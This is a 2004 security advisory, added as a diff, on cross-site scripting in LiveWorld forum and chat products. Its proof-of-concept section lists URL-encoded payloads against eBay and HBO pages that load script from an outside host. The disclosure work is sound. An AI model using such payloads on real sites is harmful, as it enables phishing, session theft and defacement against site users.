@@ -1,0 +1,42 @@
+LiveWorld Cross Site Scripting
+
+Vendor: LiveWorld, Inc
+Product: LiveWorld
+Version: Multiple Products
+Website: http://www.liveworld.com
+
+CVE: CVE-2004-2566 
+OSVDB: 9180 
+PACKETSTORM: 34143 
+
+Description:
+LiveWorld provides collaborative services for online meetings, customer care, and loyalty marketing. Supporting communication between a company and its customers, employees, or partners and among those people themselves - our services help corpor- ations cut costs, increase revenue, and solidify relationships with groups critical to their success. LiveWorld products are used on major websites such as HBO, and eBay 
+
+Cross Site Scripting:
+GulfTech Security Research have discovered Cross Site Scripting issues that are believed to be present in multiple LiveWorld Inc products such as LiveForum, LiveQ&A, LiveChat and LiveFocusGroup. It is also a good possibility that this issue exists in other LiveWorld products as they "seem" to share some of the same code. If you believe this to be incorrect, or have proof of it being 100% accurate then please let us know. These issues could allow for an attacker to run code in the context of a victims browser or temporarily deface a website that is running any of the affected applications. 
+
+Proof of Concept:
+I have done my best to contact LiveWorld, and eBay. As of the time I am writing this, the holes are not patched, and these examples work. However this may not be the case when this write up becomes public. Please note that these URI's are wrapped for the sake of readability. 
+
+http://answercenter.ebay.com/search.jsp?q=%22%3E%3Cscript+src%3D
+%22http%3A%2F%2Fstuff.gulftech.org%2Ffoobar.js%22%3E%3C%2Fscript
+%3E%3C%21--%3C%21-- 
+
+http://groups.ebay.com/findclub!execute.jspa?q=%22%3E%3Cscript+s
+rc%3D%22http%3A%2F%2Fstuff.gulftech.org%2Ffoobar.js%22%3E%3C%2Fs
+cript%3E%3C%21--%3C%21-- 
+
+http://forums.ebay.com/search.jsp?q=%22%3E%3Cscript+src%3D%22htt
+p%3A%2F%2Fstuff.gulftech.org%2Ffoobar.js%22%3E%3C%2Fscript%3E 
+
+http://boards.hbo.com/search!execute.jspa?q=%22%3E%3Cscript+src%
+3D%22http%3A%2F%2Fstuff.gulftech.org%2Ffoobar.js%22%3E%3C%2Fscri
+pt%3E%3C%21--%3C%21-- 
+
+These examples simply print the GulfTech name to the browser, but this could just as easily be a spoofed form, or a malicious script. 
+
+Solution:
+LiveWorld Inc were contacted about these issues, but have not yet responded. Hopefully they will see this report and fix the issues :) Any future fix will likely be posted on their website. 
+
+Credits:
+James Bercegay of the GulfTech Security Research Team.
